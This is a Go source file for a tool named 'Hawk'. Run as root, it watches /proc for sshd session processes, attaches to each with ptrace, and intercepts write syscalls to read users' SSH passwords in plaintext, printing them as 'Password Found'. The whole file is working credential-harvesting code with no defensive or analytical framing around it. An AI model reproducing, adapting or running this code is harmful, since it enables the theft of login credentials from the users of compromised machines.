package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var shutdownChan = make(chan struct{})

func main() {
	if syscall.Geteuid() != 0 {
		fmt.Println("[Hawk] Error: This program must be run with root or sudo permissions.")
		os.Exit(1)
	}
	fmt.Println("[Hawk] Starting...")
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigc
		close(shutdownChan)
		os.Exit(0)
	}()
	watchSSHDProcesses()
}

func watchSSHDProcesses() {
	processedPIDs := make(map[int]struct{})

	for {
		select {
		case <-shutdownChan:
			fmt.Println("Received shutdown signal. Exiting...")
			return
		default:
			//fmt.Println("Checking for SSHD processes...")
			sshdPIDs, err := findSSHDProcesses()
			if err != nil {
				fmt.Printf("Error finding SSHD processes: %v\n", err)
				time.Sleep(5 * time.Second)
				continue
			}

			for _, pid := range sshdPIDs {
				if _, processed := processedPIDs[pid]; !processed {
					//fmt.Println("Checking for SSHD processes...", pid)
					go traceSSHDProcess(pid)
					processedPIDs[pid] = struct{}{}
				}
			}

			time.Sleep(1 * time.Second)
		}
	}
}

func findSSHDProcesses() ([]int, error) {
	var sshdPIDs []int
	dir, err := os.Open("/proc")
	if err != nil {
		return nil, err
	}
	defer dir.Close()
	entries, err := dir.Readdirnames(0)
	if err != nil {
		return nil, err
	}
	for _, entry := range entries {
		pid, err := strconv.Atoi(entry)
		if err != nil {
			continue
		}
		if isSSHDProcess(pid) {
			//fmt.Printf("Found at: %d\n", pid)
			sshdPIDs = append(sshdPIDs, pid)
		}
	}

	return sshdPIDs, nil
}

func isSSHDProcess(pid int) bool {
	cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
	return regexp.MustCompile(`sshd: ([a-zA-Z]+) \[net\]`).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
}

func traceSSHDProcess(pid int) {
	fmt.Println("[Hawk] SSH Connection Identified.")
	// Attach to the process
	err := syscall.PtraceAttach(pid)
	if err != nil {
		fmt.Println("Error attaching to the process:", err)
		return
	}
	defer syscall.PtraceDetach(pid)

	// Wait for the process to stop
	var status syscall.WaitStatus
	_, err = syscall.Wait4(pid, &status, syscall.WSTOPPED, nil)
	if err != nil {
		fmt.Println("Error waiting for the process:", err)
		return
	}

	// Trace system calls
	for {
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			fmt.Println("[Hawk] SSH Connection Closed.")
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			fmt.Println("Error waiting for the process:", err)
			return
		}

		// Check if the process has exited
		if status.Exited() {
			break
		}

		// Check if the system call is a write
		if status.Stopped() && status.StopSignal() == syscall.SIGTRAP {
			reg := &syscall.PtraceRegs{}
			err := syscall.PtraceGetRegs(pid, reg)
			if err != nil {
				fmt.Println("Error getting registers:", err)
				return
			}

			if reg.Orig_rax == 1 {
				// Read the content being written
				buffer := make([]byte, reg.Rdx)
				_, err := syscall.PtracePeekData(pid, uintptr(reg.Rsi), buffer)
				if err != nil {
					fmt.Println("Error reading buffer:", err)
					return
				}

				if reg.Rdi == 5 && len(buffer) < 250 && len(buffer) > 0 && string(buffer) != "" {
					excludeString := "\\x00\\x00\\x00.\\f"
					if !regexp.MustCompile(excludeString).MatchString(string(buffer)) {
						cleanedBuffer := strings.TrimLeft(string(buffer), "\n")
						fmt.Printf("Password Found: %s\n", cleanedBuffer)
					}
				}

			}
		}

		// Continue the process
		err = syscall.PtraceSyscall(pid, 0)
		if err != nil {
			fmt.Println("Error continuing the process:", err)
			return
		}

		_, err = syscall.Wait4(pid, &status, 0, nil)
		if err != nil {
			fmt.Println("Error waiting for the process:", err)
			return
		}
	}
}
